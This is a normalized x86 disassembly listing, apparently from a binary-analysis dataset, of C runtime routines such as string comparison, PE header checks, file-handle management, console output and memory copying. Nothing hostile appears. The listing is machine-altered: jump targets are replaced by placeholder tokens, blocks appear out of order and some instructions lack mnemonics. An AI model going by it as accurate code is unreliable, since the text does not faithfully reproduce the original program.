add cx [ eax + 0x1a ]
jmp r-xdata
sub_416c54
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov edi [ ebp - 0xc ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_420148
add esp 0xc
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
push esi
mov esi [ ebp + 0xc ]
cmp esi ebx
jne r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx ax [ eax ]
dec [ ebp + 0x10 ]
inc [ ebp + 0x8 ]
movzx ecx ax
movzx eax cl
test [ eax + edi + 0x1d ] 0x4
je r-xdata
call sub_40d7cc
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx ax [ esi ]
movzx eax ax
movzx edx al
inc esi
test [ edx + edi + 0x1d ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp ax cx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
cmp al bl
jne r-xdata
movzx eax [ esi ]
xor ecx ecx
test [ eax + edi + 0x1d ] 0x4
je r-xdata
pop esi
sbb eax eax
and eax 0x2
dec eax
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp cx bx
je r-xdata
mov dl [ esi ]
dec [ ebp + 0x10 ]
cmp dl bl
je r-xdata
xor eax eax
jmp r-xdata
shl ecx 0x8
movzx ax al
or cx ax
inc [ ebp + 0x8 ]
movzx ecx cx
xor ecx ecx
jmp r-xdata
movzx eax ax
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
movzx dx dl
shl eax 0x8
or ax dx
inc esi
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_416de7
push 0x10
push r--data
call sub_40e30c
and [ ebp - 0x4 ] 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ InitializeCriticalSectionAndSpinCount@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
sub_416e50
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_416e90
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
jbe r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_416ee0
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_40e3a0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rwxdata ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_416e50
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_416e90
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416fa0
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_416fc0
mov ecx [ esp + 0x4 ]
test [ ecx + 0x4 ] 0x6
mov eax 0x1
je r-xdata
retn
mov eax [ esp + 0x14 ]
mov ecx [ eax - 0x4 ]
xor ecx eax
call sub_40b762
push ebp
mov ebp [ eax + 0x10 ]
mov edx [ eax + 0x28 ]
push edx
mov edx [ eax + 0x24 ]
push edx
call sub_417005
add esp 0x8
pop ebp
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x10 ]
mov [ edx ] eax
mov eax 0x3
sub_417005
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push ebp
push eax
push 0xfffffffe
push sub_416fc0
push [ fs : 0x0 ]
mov eax [ rwxdata ]
xor eax esp
push eax
lea eax [ esp + 0x4 ]
mov [ fs : 0x0 ] eax
mov ecx [ esp + 0x4 ]
mov [ fs : 0x0 ] ecx
add esp 0x18
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2c ] 0xffffffff
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0xc ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
cmp esi [ esp + 0x2c ]
jbe r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4170b5
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4170d4
mov eax [ esp + 0x28 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_4170b5
push ebx
push ecx
mov ebx rwxdata
mov ecx [ esp + 0xc ]
mov [ ebx + 0x8 ] ecx
mov [ ebx + 0x4 ] eax
mov [ ebx + 0xc ] ebp
push ebp
push ecx
push eax
pop eax
pop ecx
pop ebp
pop ecx
pop ebx
retn 0x4
sub_4170d7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rwxdata ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rwxdata ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rwxdata ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rwxdata ]
cmp eax 0xffffffff
jne r-xdata
call sub_42132f
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40b762
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rwxdata ] 0x1
jmp r-xdata
cmp [ rwxdata ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rwxdata ] esi
sub_41719c
push 0x10
push r--data
call sub_40e30c
xor esi esi
mov [ ebp - 0x20 ] esi
xor eax eax
cmp [ ebp + 0x8 ] esi
setne al
cmp eax esi
jne r-xdata
push [ ebp + 0x8 ]
call sub_42137b
mov [ ebp - 0x1c ] eax
push 0x3
call sub_4160e9
pop ecx
pop ecx
mov [ ebp - 0x4 ] esi
call sub_40d7df
mov [ eax ] esi
call sub_40d7cc
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417232
mov eax [ ebp - 0x20 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
add [ ebp + 0x8 ] 0x2
push eax
call sub_4170d7
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
call sub_40e351
retn
mov eax [ ebp - 0x1c ]
dec [ ebp - 0x1c ]
test eax eax
je r-xdata
or [ ebp - 0x20 ] 0xffffffff
sub_41723b
push 0xc
push r--data
call sub_40e30c
push 0x3
call sub_4160e9
pop ecx
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_4170d7
pop ecx
movzx eax ax
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417278
mov ax [ ebp - 0x1c ]
call sub_40e351
retn
sub_417281
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] ebx
je r-xdata
cmp [ esi ] bl
jne r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40c8c3
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ esi ]
push eax
call sub_413987
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] ebx
setne al
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push 0x1
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0xac ]
cmp ecx 0x1
jle r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx cx [ esi ]
mov [ eax ] cx
jmp r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx [ eax + 0xac ]
jb r-xdata
cmp [ ebp + 0x10 ] ecx
jl r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
call sub_40d7cc
mov [ eax ] 0x2a
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ esi + 0x1 ] bl
je r-xdata
xor edx edx
cmp [ ebp + 0x8 ] ebx
setne dl
push edx
push [ ebp + 0x8 ]
push ecx
push esi
push 0x9
push [ eax + 0x4 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
mov eax [ ebp - 0x10 ]
jne r-xdata
pop esi
pop ebx
leave
retn
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ eax + 0xac ]
cmp [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
sub_4173c0
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_4173eb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
test eax eax
jl r-xdata
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
and [ eax ] 0x0
or eax 0xffffffff
cmp eax [ rwxdata ]
jae r-xdata
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rwxdata ]
mov ecx [ edi ]
shl esi 0x6
cmp [ esi + ecx ] 0xffffffff
jne r-xdata
cmp [ rwxdata ] 0x1
push ebx
mov ebx [ ebp + 0xc ]
jne r-xdata
mov eax [ edi ]
mov [ esi + eax ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
pop ebp
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_41746c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
cmp ecx ebx
push esi
push edi
jl r-xdata
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7df
mov [ eax ] ebx
or eax 0xffffffff
cmp ecx [ rwxdata ]
jae r-xdata
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rwxdata ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x6
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rwxdata ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
sub ecx ebx
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_4174f2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
push esi
xor esi esi
cmp eax esi
jl r-xdata
call sub_40d7df
and [ eax ] 0x0
call sub_40d7cc
mov [ eax ] 0x9
or eax 0xffffffff
pop ebp
retn
call sub_40d7df
mov [ eax ] esi
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x9
call sub_40d749
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax [ rwxdata ]
jae r-xdata
pop esi
pop ebp
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
add eax ecx
test [ eax + 0x4 ] 0x1
jne r-xdata
mov eax [ eax ]
sub_417569
push 0xc
push r--data
call sub_40e30c
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rwxdata ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_40e351
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417600
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_416de7
pop ecx
pop ecx
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_417609
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rwxdata ]
shl eax 0x6
lea eax [ ecx + eax + 0xc ]
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_417630
push 0x18
push r--data
call sub_40e30c
or [ ebp - 0x1c ] 0xffffffff
xor edi edi
mov [ ebp - 0x24 ] edi
push 0xb
call sub_416026
pop ecx
test eax eax
jne r-xdata
push 0xb
call sub_4160e9
pop ecx
mov [ ebp - 0x4 ] edi
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4177c1
mov eax [ ebp - 0x1c ]
mov esi [ edi * 4 + rwxdata ]
test esi esi
je r-xdata
call sub_40e351
retn
push 0x40
push 0x20
call sub_41348c
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov [ ebp - 0x20 ] esi
mov eax [ edi * 4 + rwxdata ]
add eax 0x800
cmp esi eax
jae r-xdata
lea ecx [ edi * 4 + rwxdata ]
mov [ ecx ] eax
add [ rwxdata ] 0x20
cmp [ ebp - 0x1c ] 0xffffffff
jne r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl edi 0x5
mov [ ebp - 0x1c ] edi
mov eax edi
sar eax 0x5
mov ecx edi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rwxdata ]
mov [ eax + ecx + 0x4 ] 0x1
push edi
call sub_417569
pop ecx
test eax eax
jne r-xdata
mov [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
and [ eax + 0x8 ] 0x0
add eax 0x40
mov [ ebp - 0x20 ] eax
jmp r-xdata
inc edi
jmp r-xdata
add esi 0x40
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
or [ ebp - 0x1c ] 0xffffffff
mov edx [ ecx ]
add edx 0x800
cmp eax edx
jae r-xdata
mov [ ebp - 0x28 ] edi
cmp edi 0x40
jge r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push 0xa
call sub_4160e9
pop ecx
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_417703
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call sub_416de7
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov [ ebp - 0x24 ] ebx
jmp r-xdata
mov [ esi + 0x4 ] 0x1
or [ esi ] 0xffffffff
sub esi [ edi * 4 + rwxdata ]
sar esi 0x6
mov eax edi
shl eax 0x5
add esi eax
mov [ ebp - 0x1c ] esi
sub_4177ca
push 0xc
push r--data
call sub_40e30c
xor edi edi
mov [ ebp - 0x1c ] edi
xor bl bl
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x4000
je r-xdata
add bl 0x20
test [ ebp + 0xc ] 0x80
je r-xdata
or bl 0x80
push [ ebp + 0x8 ]
call [ GetFileType@IAT ]
cmp eax edi
jne r-xdata
or bl 0x10
cmp eax 0x2
jne r-xdata
call [ GetLastError@IAT ]
push eax
call sub_40d7f2
pop ecx
cmp eax 0x3
jne r-xdata
or bl 0x40
jmp r-xdata
call sub_417630
mov esi eax
mov [ ebp + 0xc ] esi
cmp esi 0xffffffff
jne r-xdata
or bl 0x8
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
push esi
call sub_4173eb
pop ecx
pop ecx
or bl 0x1
mov eax esi
sar eax 0x5
lea ecx [ eax * 4 + rwxdata ]
mov eax esi
and eax 0x1f
shl eax 0x6
mov edx [ ecx ]
mov [ edx + eax + 0x4 ] bl
mov edx [ ecx ]
lea edx [ edx + eax + 0x24 ]
and [ edx ] 0x80
mov ecx [ ecx ]
lea eax [ ecx + eax + 0x24 ]
and [ eax ] 0x7f
mov [ ebp - 0x1c ] 0x1
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4178b8
cmp [ ebp - 0x1c ] edi
je r-xdata
call sub_40d7cc
mov [ eax ] 0x18
call sub_40d7df
mov [ eax ] edi
jmp r-xdata
or eax 0xffffffff
mov eax esi
jmp r-xdata
call sub_40e351
retn
sub_4178b8
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_417609
pop ecx
retn
mov eax esi
sar eax 0x5
mov ecx esi
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rwxdata ]
lea eax [ eax + ecx + 0x4 ]
and [ eax ] 0xfe
sub_4178e0
push 0x10
push r--data
call sub_40e30c
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
xor ebx ebx
cmp eax ebx
jl r-xdata
call sub_40d7cc
mov [ eax ] 0x9
call sub_40d7cc
mov [ eax ] 0x9
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_40d749
add esp 0x14
jmp r-xdata
cmp eax [ rwxdata ]
jb r-xdata
call sub_40e351
retn
or eax 0xffffffff
jmp r-xdata
mov ecx eax
sar ecx 0x5
lea edi [ ecx * 4 + rwxdata ]
mov esi eax
and esi 0x1f
shl esi 0x6
mov ecx [ edi ]
movsx ecx [ esi + ecx + 0x4 ]
and ecx 0x1
je r-xdata
push eax
call sub_417569
pop ecx
mov [ ebp - 0x4 ] ebx
mov eax [ edi ]
test [ esi + eax + 0x4 ] 0x1
je r-xdata
call sub_40d7cc
mov [ eax ] 0x9
or [ ebp - 0x1c ] 0xffffffff
push [ ebp + 0x8 ]
call sub_4174f2
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] ebx
call [ GetLastError@IAT ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4179b7
mov eax [ ebp - 0x1c ]
call sub_40d7df
mov ecx [ ebp - 0x1c ]
mov [ eax ] ecx
cmp [ ebp - 0x1c ] ebx
je r-xdata
sub_4179c1
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x8 ] esi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
shr ecx 0x7
jmp r-xdata
movdqa xmm0 [ esi ]
movdqa xmm1 [ esi + 0x10 ]
movdqa xmm2 [ esi + 0x20 ]
movdqa xmm3 [ esi + 0x30 ]
movdqa [ edi ] xmm0
movdqa [ edi + 0x10 ] xmm1
movdqa [ edi + 0x20 ] xmm2
movdqa [ edi + 0x30 ] xmm3
movdqa xmm4 [ esi + 0x40 ]
movdqa xmm5 [ esi + 0x50 ]
movdqa xmm6 [ esi + 0x60 ]
movdqa xmm7 [ esi + 0x70 ]
movdqa [ edi + 0x40 ] xmm4
movdqa [ edi + 0x50 ] xmm5
movdqa [ edi + 0x60 ] xmm6
movdqa [ edi + 0x70 ] xmm7
lea esi [ esi + 0x80 ]
lea edi [ edi + 0x80 ]
dec ecx
jne r-xdata
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_417a48
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp + 0xc ]
mov eax ebx
cdq
mov ecx eax
mov eax [ ebp + 0x8 ]
xor ecx edx
sub ecx edx
and ecx 0xf
xor ecx edx
sub ecx edx
cdq
mov edi eax
xor edi edx
sub edi edx
and edi 0xf
xor edi edx
sub edi edx
mov edx ecx
or edx edi
jne r-xdata
cmp ecx edi
jne r-xdata
mov esi [ ebp + 0x10 ]
mov ecx esi
and ecx 0x7f
mov [ ebp - 0x18 ] ecx
cmp esi ecx
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
neg ecx
add ecx 0x10
mov [ ebp - 0x1c ] ecx
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp - 0x1c ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
add ecx [ ebp - 0x1c ]
mov edx [ ebp + 0xc ]
add edx [ ebp - 0x1c ]
mov eax [ ebp + 0x10 ]
sub eax [ ebp - 0x1c ]
push eax
push edx
push ecx
call sub_417a48
add esp 0xc
mov eax [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
sub esi ecx
push esi
push ebx
push eax
call sub_4179c1
add esp 0xc
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
mov esi [ ebp - 0x8 ]
mov edi [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ebx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
add edx ebx
sub edx ecx
mov [ ebp - 0x14 ] edx
add ebx eax
sub ebx ecx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp - 0x14 ]
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x18 ]
[ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_417b7b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
xor eax eax
push ebx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
push ebx
pushfd
pop eax
mov ecx eax
xor eax 0x200000
push eax
popfd
pushfd
pop edx
sub edx ecx
je r-xdata
pop ebx
test [ ebp - 0x4 ] 0x4000000
je r-xdata
push ecx
popfd
xor eax eax
cpuid
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x10 ] ecx
mov eax 0x1
cpuid
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
call sub_417b2b
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
pop ebx
leave
retn
sub_417c0b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x1 ]
push esi
cmp ecx 0xfffffffe
jbe r-xdata
xor esi esi
cmp [ rwxdata ] esi
jne r-xdata
call sub_40d7cc
xor esi esi
mov [ rwxdata ] eax
xor eax eax
call sub_40d7cc
jmp r-xdata
pop esi
pop ebp
retn
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
push 0x16
pop eax
jmp r-xdata
sub_417c56
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
cmp [ rwxdata ] esi
je r-xdata
call sub_40d7cc
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_40d749
add esp 0x14
push 0x16
pop eax
jmp r-xdata
mov ecx [ rwxdata ]
mov [ eax ] ecx
xor eax eax
pop esi
pop ebp
retn
sub_417c97
mov edi edi
push ebp
mov ebp esp
push 0x140
push 0x0
push [ rwxdata ]
call [ HeapAlloc@IAT ]
mov [ rwxdata ] eax
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
and [ rwxdata ] 0x0
and [ rwxdata ] 0x0
mov [ rwxdata ] eax
xor eax eax
mov [ rwxdata ] ecx
mov [ rwxdata ] 0x10
inc eax
pop ebp
retn
pop ebp
retn
sub_417ce5
mov edi edi
push ebp
mov ebp esp
mov ecx [ rwxdata ]
mov eax [ rwxdata ]
imul ecx ecx 0x14
add ecx eax
jmp r-xdata
cmp eax ecx
jb r-xdata
mov edx [ ebp + 0x8 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
xor eax eax
pop ebp
retn
add eax 0x14
sub_417d15
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi esi
sub edi [ ecx + 0xc ]
add esi 0xfffffffc
shr edi 0xf
mov ecx edi
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0x10 ] ecx
mov ecx [ esi ]
dec ecx
mov [ ebp - 0x4 ] ecx
test cl 0x1
jne r-xdata
pop edi
pop esi
leave
retn
push ebx
lea ebx [ ecx + esi ]
mov edx [ ebx ]
mov [ ebp - 0xc ] edx
mov edx [ esi - 0x4 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0xc ]
mov [ ebp + 0xc ] ebx
test dl 0x1
jne r-xdata
mov edx ecx
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
sar edx 0x4
dec edx
cmp edx 0x3f
jbe r-xdata
